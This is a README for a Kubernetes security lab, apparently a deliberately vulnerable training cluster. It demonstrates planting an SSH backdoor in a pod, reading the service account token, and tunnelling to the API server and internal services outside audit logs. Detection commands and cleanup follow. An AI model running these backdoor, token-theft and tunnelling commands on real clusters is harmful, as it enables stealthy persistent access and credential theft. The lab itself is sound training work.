# SSH Server Running

An SSH server running inside a Kubernetes pod gives an attacker a persistent, authenticated, and encrypted channel back into the cluster — one that bypasses Kubernetes audit logging and survives pod restarts as long as the deployment is live.

## Description

Attackers may run an SSH server in a container to get a persistent remote shell to the container. Unlike `kubectl exec` (which requires valid Kubernetes credentials and generates API server audit events), an SSH connection goes directly to the pod's network port. Once established, the attacker can execute commands, forward ports to reach internal cluster services, and exfiltrate data through the encrypted tunnel.

This technique is used for:

- **Persistence**: The SSH server restarts with the pod. The attacker's public key persists in the ConfigMap or image.
- **Stealth**: SSH traffic does not appear in Kubernetes audit logs. It only appears in network flow logs if those are collected.
- **Port forwarding**: The attacker can tunnel connections to internal cluster services (databases, API servers, other pods) through the SSH connection without needing `kubectl port-forward`.
- **Lateral movement**: From inside the SSH session, the container's service account token can be used to pivot to the Kubernetes API.

## Prerequisites

- A running Kubernetes cluster (Kind `workshop-cluster` is assumed).
- `kubectl` installed and configured to connect to your cluster.
- `ssh` and `ssh-keygen` available on your local machine.

## Quick Start

### 1. Generate an SSH key pair for the demo

```bash
ssh-keygen -t ed25519 -f /tmp/dvka-ssh -N "" -C "dvka-demo"
```

This creates `/tmp/dvka-ssh` (private key) and `/tmp/dvka-ssh.pub` (public key).

### 2. Inject your public key into the manifest

```bash
# Print your public key
cat /tmp/dvka-ssh.pub
```

Edit `ssh-server.yaml` and replace the placeholder line in the `authorized_keys` field with the output of the command above. The field is under `data.authorized_keys` in the `ssh-config` ConfigMap.

Alternatively, patch it directly:

```bash
PUB_KEY=$(cat /tmp/dvka-ssh.pub)
kubectl create configmap ssh-config \
  --from-literal="authorized_keys=$PUB_KEY" \
  --from-literal="sshd_config=$(cat ssh-server.yaml | grep -A30 'sshd_config:' | tail -n +2 | head -20)" \
  --dry-run=client -o yaml
```

### 3. Deploy the SSH backdoor

```bash
kubectl apply -f ssh-server.yaml
```

> **Note:** The `apk add openssh-server` step takes ~15-20 seconds on first start while packages are downloaded and installed. The pod will stay in `ContainerCreating` or show `0/1 Ready` during this time — this is expected.

Wait for the pod to be ready (the init step installs openssh-server from apk, which takes ~30 seconds):

```bash
kubectl wait --for=condition=Ready pod -l app=ssh-backdoor -n ssh-lab --timeout=120s
```

Verify the SSH server started successfully:

```bash
kubectl logs -l app=ssh-backdoor -n ssh-lab
```

Expected output:

```
[ssh-backdoor] SSH server starting on port 2222...
Server listening on 0.0.0.0 port 2222.
```

### 4. Connect to the SSH server

Forward the SSH port to your local machine:

```bash
kubectl port-forward svc/ssh-backdoor 2222:2222 -n ssh-lab
```

In a new terminal, connect using the private key:

```bash
ssh -i /tmp/dvka-ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -p 2222 root@localhost
```

You now have an interactive shell inside the container.

### 5. Execute commands and access cluster credentials

Inside the SSH session:

```bash
# Confirm identity and cluster context
id
hostname
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Read the service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Enumerate the pod's network — discover internal cluster services
cat /etc/resolv.conf
cat /etc/hosts

# Check what cluster services are reachable
curl -sk https://kubernetes.default.svc.cluster.local/version
```

### 6. Use SSH port forwarding to reach internal cluster services

The SSH tunnel can expose internal services without any Kubernetes credentials. Open a new local terminal (leave the port-forward and SSH session running):

```bash
# Forward local port 9090 to the Kubernetes API server through the pod
ssh -i /tmp/dvka-ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -p 2222 root@localhost \
  -L 9090:kubernetes.default.svc.cluster.local:443 \
  -N &

# Now query the API server via the tunnel using the stolen token
TOKEN=$(ssh -i /tmp/dvka-ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  -p 2222 root@localhost "cat /var/run/secrets/kubernetes.io/serviceaccount/token" 2>/dev/null)

curl -sk -H "Authorization: Bearer $TOKEN" \
  https://localhost:9090/api/v1/namespaces | \
  python3 -c "import sys,json; [print(n['metadata']['name']) for n in json.load(sys.stdin)['items']]"
```

### 7. Simulate attacker persistence after initial access

A realistic attacker who has RCE on a container would install the SSH server and inject their key programmatically:

```bash
# Simulate running this from inside a compromised container (via RCE)
# This is what the attacker would run using their initial foothold:
kubectl exec deploy/ssh-backdoor -n ssh-lab -- /bin/sh -c "
  # Check if sshd is already running
  pgrep sshd && echo 'SSH already running' || echo 'SSH not running - attacker would install it'

  # In a real attack the attacker would also add a cron job for persistence
  echo 'Simulating persistence check...'
  cat /var/spool/cron/crontabs/root 2>/dev/null || echo 'No crontab yet'
"
```

### 8. Detect the backdoor (defender perspective)

From your workstation:

```bash
# Look for pods with exposed SSH ports (22 or 2222)
kubectl get pods --all-namespaces -o json | \
  python3 -c "
import sys, json
pods = json.load(sys.stdin)['items']
for p in pods:
    ns = p['metadata']['namespace']
    name = p['metadata']['name']
    for c in p['spec'].get('containers', []):
        for port in c.get('ports', []):
            if port.get('containerPort') in [22, 2222]:
                print(f'ALERT: SSH port in {ns}/{name} container {c[\"name\"]}: port {port[\"containerPort\"]}')
"

# Look for processes named sshd inside pods (requires exec permission)
kubectl get pods -n ssh-lab -o jsonpath='{.items[*].metadata.name}' | \
  xargs -n1 -I{} kubectl exec {} -n ssh-lab -- pgrep -a sshd 2>/dev/null
```

## SSH Tunneling for Lateral Movement

Beyond the API server tunnel shown in Step 6, SSH local port forwarding (`-L`) can reach any internal ClusterIP service — databases, dashboards, or other pods — making them accessible from the attacker's workstation without any Kubernetes credentials.

### Example: Forward an internal ClusterIP service

Suppose a Redis instance is running at `redis.default.svc.cluster.local:6379`. With the SSH tunnel already port-forwarded via `kubectl port-forward` (Step 4), open a new terminal:

```bash
# Forward local port 6379 to the internal Redis ClusterIP through the SSH backdoor
ssh -i /tmp/dvka-ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -p 2222 root@localhost \
  -L 6379:redis.default.svc.cluster.local:6379 \
  -N &
```

Now the attacker can access the internal Redis service from their workstation:

```bash
# Query the internal Redis service through the tunnel
curl -s telnet://localhost:6379 <<< "INFO server" || \
  echo "Connect with: redis-cli -h localhost -p 6379"
```

This pattern works for any ClusterIP service — replace the target address and port:

```bash
# Generic pattern:
# ssh -L LOCAL_PORT:CLUSTER_SERVICE:SERVICE_PORT -N
# Examples:
#   -L 5432:postgres.prod.svc.cluster.local:5432    (PostgreSQL)
#   -L 3000:grafana.monitoring.svc.cluster.local:80  (Grafana dashboard)
#   -L 8500:consul.default.svc.cluster.local:8500    (Consul API)
```

All traffic flows through the encrypted SSH tunnel, invisible to Kubernetes audit logs and most network monitoring tools.

## Cleanup

```bash
# Kill the background SSH tunnel if running
pkill -f "ssh.*9090:kubernetes.default" 2>/dev/null || true

kubectl delete -f ssh-server.yaml

# Remove the temporary keys
rm -f /tmp/dvka-ssh /tmp/dvka-ssh.pub
```

## Resources

- [OpenSSH Server on Docker Hub](https://hub.docker.com/r/linuxserver/openssh-server)
- [MITRE ATT&CK: SSH (Remote Services)](https://attack.mitre.org/techniques/T1021/004/)
- [MITRE ATT&CK: SSH Authorized Keys](https://attack.mitre.org/techniques/T1098/004/)
- [Kubernetes Network Policies](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [Falco Runtime Security - Detecting SSH in Containers](https://falco.org/docs/rules/)
